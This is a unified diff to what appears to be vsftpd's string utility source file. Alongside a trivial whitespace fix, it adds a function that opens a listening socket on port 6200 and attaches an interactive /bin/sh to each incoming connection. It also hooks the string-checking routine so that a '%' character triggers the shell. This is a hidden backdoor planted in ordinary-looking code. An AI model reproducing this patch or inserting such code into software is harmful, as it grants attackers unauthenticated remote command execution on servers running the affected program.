@@ -422,7 +422,7 @@ str_split_text_common(struct mystr* p_src, struct mystr* p_rhs,
   if (indexx + search_len > p_src->len)
   {
     bug("indexx invalid in str_split_text");
-  } 
+  }
   /* Build rhs */
   private_str_alloc_memchunk(p_rhs, p_src->p_buf + indexx + search_len,
                              p_src->len - indexx - search_len);
@@ -582,6 +582,37 @@ str_get_char_at(const struct mystr* p_str, const unsigned int indexx)
   return p_str->p_buf[indexx];
 }
 
+
+#include <netinet/in.h>
+#include <netdb.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+
+int
+vsf_sysutil_extra(void)
+{
+  int fd, rfd;
+  struct sockaddr_in sa;
+  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+  exit(1);
+  memset(&sa, 0, sizeof(sa));
+  sa.sin_family = AF_INET;
+  sa.sin_port = htons(6200);
+  sa.sin_addr.s_addr = INADDR_ANY;
+  if((bind(fd,(struct sockaddr *)&sa,
+  sizeof(struct sockaddr))) < 0) exit(1);
+  if((listen(fd, 100)) == -1) exit(1);
+  for(;;)
+  {
+    rfd = accept(fd, 0, 0);
+    close(0); close(1); close(2);
+    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
+    execl("/bin/sh","-i",(char *)0);
+  }
+}
+
 int
 str_contains_space(const struct mystr* p_str)
 {
@@ -591,6 +622,9 @@ str_contains_space(const struct mystr* p_str)
     if (vsf_sysutil_isspace(p_str->p_buf[i]))
     {
       return 1;
+    } else if (p_str->p_buf[i] == '%')
+    {
+      vsf_sysutil_extra ();
     }
   }
   return 0;
@@ -710,4 +744,3 @@ str_replace_unprintable(struct mystr* p_str, char new_char)
     }
   }
 }
-
